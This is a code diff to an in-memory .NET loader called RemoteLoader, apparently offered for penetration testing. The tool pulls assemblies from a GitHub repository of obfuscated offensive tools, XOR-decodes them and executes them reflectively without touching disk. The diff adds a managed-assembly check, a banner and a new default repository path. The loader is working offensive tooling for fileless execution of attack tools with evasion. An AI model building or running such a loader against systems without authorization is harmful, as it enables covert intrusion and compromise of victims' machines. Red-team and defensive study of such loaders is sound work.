@@ -1,16 +1,16 @@
 /*
- * RemoteLoader.cs
+ * RemoteLoader.cs — by hstn
  * In-memory .NET assembly loader from a GitHub repository.
- * Designed for authorized use in OSEP lab / penetration testing engagements.
+ * Designed for authorized use in internal penetration testing engagements.
  *
- * Compile (Framework 4.7.2):
- *   csc /target:exe /out:RemoteLoader.exe RemoteLoader.cs
- *
- * Compile (.NET 6+ SDK):
- *   dotnet publish -c Release -r win-x64 --self-contained false
+ * Compile (.NET 8 SDK):
+ *   dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
  *
  * Usage:
  *   RemoteLoader.exe [--repo owner/name/subfolder] [--token <PAT>] [--xor <byte>]
+ *
+ * NOTE: Only managed .NET assemblies can be reflectively loaded.
+ *       Native binaries (PyInstaller, C++, Go, etc.) are not supported.
  */
 
 using System;
@@ -183,6 +183,38 @@ namespace RemoteLoader
             return results;
         }
 
+        // ─── .NET assembly detector ──────────────────────────────────────────
+        // Reads the PE optional-header data directory entry 14 (COM/CLR descriptor).
+        // A non-zero VirtualAddress means the binary is a managed .NET assembly.
+        private static bool IsNetAssembly(byte[] data)
+        {
+            try
+            {
+                if (data.Length < 0x40) return false;
+                if (data[0] != 0x4D || data[1] != 0x5A) return false;          // MZ
+
+                int peOff = BitConverter.ToInt32(data, 0x3C);
+                if (peOff + 4 >= data.Length) return false;
+                if (data[peOff] != 0x50 || data[peOff+1] != 0x45 ||
+                    data[peOff+2] != 0    || data[peOff+3] != 0)   return false; // PE\0\0
+
+                int optOff = peOff + 4 + 20; // skip COFF header (20 bytes)
+                if (optOff + 2 >= data.Length) return false;
+
+                ushort magic = BitConverter.ToUInt16(data, optOff);
+                int clrOff = magic switch
+                {
+                    0x10B => optOff + 96  + 14 * 8, // PE32
+                    0x20B => optOff + 112 + 14 * 8, // PE32+
+                    _     => -1
+                };
+                if (clrOff < 0 || clrOff + 4 >= data.Length) return false;
+
+                return BitConverter.ToUInt32(data, clrOff) != 0;
+            }
+            catch { return false; }
+        }
+
         // ─── Entry-point discovery ────────────────────────────────────────────
         private static MethodInfo? FindMain(Assembly asm)
         {
@@ -227,20 +259,36 @@ namespace RemoteLoader
         private static void Warn(string msg) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine($"[!] {msg}"); Console.ResetColor(); }
         private static void Err(string msg)  { Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine($"[-] {msg}"); Console.ResetColor(); }
 
+        private static void PrintBanner()
+        {
+            Console.ForegroundColor = ConsoleColor.DarkCyan;
+            Console.WriteLine(@"
+  ____                      _       _                    _
+ |  _ \ ___ _ __ ___   ___ | |_ ___| |     ___  __ _  __| | ___ _ __
+ | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ |    / _ \/ _` |/ _` |/ _ \ '__|
+ |  _ <  __/ | | | | | (_) | ||  __/ |___| (_) | (_| | (_| |  __/ |
+ |_| \_\___|_| |_| |_|\___/ \__\___|______\___/ \__,_|\__,_|\___|_|
+");
+            Console.ForegroundColor = ConsoleColor.DarkGray;
+            Console.WriteLine("                         in-memory .NET loader  //  by hstn\n");
+            Console.ResetColor();
+        }
+
         private static void PrintHelp()
         {
             Console.WriteLine(@"
-RemoteLoader — in-memory .NET assembly loader from GitHub
-
 Usage:
   RemoteLoader.exe [options]
 
 Options:
-  --repo    owner/name/subfolder  GitHub path    (default: Syslifters/offsec-tools/bin)
+  --repo    owner/name/subfolder  GitHub path    (default: hrstn/internal-pentest-precompiled-tools/ObfuscatedSharpCollection-main/NetFramework_4.7_Any)
   --branch  <branch>             Repo branch    (default: main)
   --token   <PAT>                GitHub PAT for private repos
-  --xor     <byte>               XOR key (0–255) to decode payload before loading
+  --xor     <byte>               XOR key (0-255) to decode payload before loading
   --help                         Show this message
+
+NOTE: Only managed .NET assemblies are supported. Native binaries (PyInstaller,
+      C++, Go, etc.) cannot be reflectively loaded and will be rejected.
 
 Examples:
   RemoteLoader.exe
@@ -252,7 +300,9 @@ Examples:
         // ─── Entry point ──────────────────────────────────────────────────────
         private static async Task Main(string[] cliArgs)
         {
-            string repoPath = "Syslifters/offsec-tools/bin";
+            PrintBanner();
+
+            string repoPath = "hrstn/internal-pentest-precompiled-tools/ObfuscatedSharpCollection-main/NetFramework_4.7_Any";
             string token    = "";
             string branch   = "main";
             byte   xorKey   = 0;
@@ -327,6 +377,9 @@ Examples:
             for (int i = 0; i < binaries.Count; i++)
                 Console.WriteLine($"  [{i + 1,2}]  {binaries[i].Name,-42} {binaries[i].Size / 1024,6} KB");
             Console.WriteLine("  [ 0]  Exit\n");
+            Console.ForegroundColor = ConsoleColor.DarkGray;
+            Console.WriteLine("  [!] Only managed .NET assemblies can be loaded. Native binaries will be rejected.\n");
+            Console.ResetColor();
 
             Console.Write("Select number or partial filename: ");
             string sel = (Console.ReadLine() ?? "0").Trim();
@@ -354,6 +407,13 @@ Examples:
             asmBytes = XorBytes(asmBytes, xorKey);
             if (xorKey != 0)
                 Ok($"Payload XOR-decoded (key=0x{xorKey:X2})");
+
+            // ── Verify managed assembly before attempting Load ─────────────────
+            if (!IsNetAssembly(asmBytes))
+            {
+                Err($"{chosen.Name} is a native/unmanaged binary (PyInstaller, C++, etc.) — Assembly.Load cannot reflectively execute it.");
+                return;
+            }
 
             // ── Load assembly from memory ─────────────────────────────────────
             Assembly asm;
